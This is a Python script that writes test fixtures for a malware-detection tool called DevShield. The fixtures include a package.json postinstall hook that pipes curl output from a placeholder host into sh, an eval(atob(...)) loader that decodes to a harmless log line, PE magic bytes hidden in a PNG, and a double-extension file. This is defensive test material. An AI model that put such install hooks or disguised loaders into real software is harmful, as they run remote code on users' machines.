#!/usr/bin/env python3
"""
DevShield fixture generator.
Usage: python generate_fixtures.py <target_dir> [--clean]

Writes SAFE, NON-EXECUTABLE test artifacts to <target_dir>.
Never executes, imports, or invokes anything it writes.
"""
import argparse
import hashlib
import json
import os
import sys

# ---------------------------------------------------------------------------
# Fixture definitions: list of (relative_path, content) tuples.
# content is either bytes (written in 'wb' mode) or str (written in 'w' mode).
# ---------------------------------------------------------------------------

_VENDOR_PKG_JSON = json.dumps({
    "name": "helper",
    "version": "1.0.0",
    "scripts": {
        "postinstall": "curl https://example.invalid/setup.sh | sh"
    },
    "description": "DEVSHIELD TEST FIXTURE — DO NOT RUN npm install IN THIS DIRECTORY"
}, indent=2)

FIXTURES = [
    # 1. Disguised binary: PNG file starting with MZ (PE magic bytes)
    (
        "assets/logo.png",
        b"MZ" + b"\x00" * 62,
    ),
    # 2. Double-extension file: plain text content, suspicious name
    (
        "docs/invoice.pdf.exe",
        "This is a test file for DevShield fixture detection. Not a real executable.",
    ),
    # 3. Suspicious postinstall script in package.json
    (
        "vendor/helper/package.json",
        _VENDOR_PKG_JSON,
    ),
    # 4. Warning README alongside the suspicious package
    (
        "vendor/helper/README.md",
        "# WARNING\n"
        "This directory contains a DevShield test fixture.\n"
        "Do NOT run `npm install` here. "
        "The postinstall script is intentionally suspicious for testing purposes only.\n",
    ),
    # 5. Non-registry dependency in requirements file
    (
        "vendor/requirements_fixture.txt",
        "# DevShield test fixture - non-registry dependency signal\n"
        "git+https://example.invalid/pkg.git#egg=suspicious-pkg\n",
    ),
    # 6. Obfuscated JS: eval(atob(...)) pattern
    #    The base64 decodes to: console.log("devshield-test")
    (
        "src/utils/loader.js",
        '// DevShield test fixture \u2014 obfuscated code signal\n'
        '// This file contains an intentional eval(atob(...)) pattern for testing only.\n'
        '// It does not run any harmful code; the decoded payload is: console.log("devshield-test")\n'
        'eval(atob("Y29uc29sZS5sb2coImRldnNoaWVsZC10ZXN0Iik="));\n',
    ),
    # 7. Fake PE binary in source directory
    (
        "src/lib/tool.dll",
        b"MZ" + b"\x00" * 62,
    ),
    # 8. Harmless new Java source file
    (
        "src/NewFeature.java",
        '// DevShield test fixture \u2014 harmless new file\n'
        "public class NewFeature {\n"
        "    public static void hello() {\n"
        '        System.out.println("Hello from NewFeature");\n'
        "    }\n"
        "}\n",
    ),
]

README_CONTENT = (
    "# Demo Workspace\n"
    "This is a sample project for DevShield integration testing.\n"
    "Last updated by generate_fixtures.py\n"
)


def main():
    parser = argparse.ArgumentParser(
        description="Generate DevShield test fixtures into <target_dir>."
    )
    parser.add_argument("target_dir", help="Directory to write fixtures into")
    parser.add_argument(
        "--clean",
        action="store_true",
        help="Remove previously generated fixture files listed in fixture_manifest.json",
    )
    args = parser.parse_args()

    target = os.path.abspath(args.target_dir)
    script_dir = os.path.dirname(os.path.abspath(__file__))
    manifest_path = os.path.join(script_dir, "fixture_manifest.json")

    # --clean: remove files recorded in the manifest
    if args.clean and os.path.isfile(manifest_path):
        with open(manifest_path) as f:
            old_entries = json.load(f)
        for rel in old_entries:
            full = os.path.join(target, rel)
            if os.path.isfile(full):
                os.remove(full)
                print(f"Removed: {full}")

    # Write fixtures
    created = []
    for rel_path, content in FIXTURES:
        full_path = os.path.join(target, rel_path)
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        mode = "wb" if isinstance(content, bytes) else "w"
        with open(full_path, mode) as f:
            f.write(content)
        print(f"Created: {full_path}")
        created.append(rel_path)

    # README.md: append to existing or create new
    readme_path = os.path.join(target, "README.md")
    if os.path.isfile(readme_path):
        with open(readme_path, "a") as f:
            f.write("\n" + README_CONTENT)
        print(f"Appended to: {readme_path}")
    else:
        with open(readme_path, "w") as f:
            f.write(README_CONTENT)
        print(f"Created: {readme_path}")
    created.append("README.md")

    # Compute SHA-256 of tool.dll and append to analyzer/known_bad_hashes.txt
    dll_path = os.path.join(target, "src/lib/tool.dll")
    sha256 = hashlib.sha256(open(dll_path, "rb").read()).hexdigest()

    analyzer_dir = os.path.join(script_dir, "..", "analyzer")
    bad_hashes_path = os.path.join(analyzer_dir, "known_bad_hashes.txt")
    os.makedirs(os.path.dirname(bad_hashes_path), exist_ok=True)
    with open(bad_hashes_path, "a") as f:
        f.write(sha256 + "\n")

    # Save manifest
    with open(manifest_path, "w") as f:
        json.dump(created, f, indent=2)

    print(f"\nFixture manifest saved to {manifest_path}")
    print(f"Appended hash {sha256} to known_bad_hashes.txt")


if __name__ == "__main__":
    main()
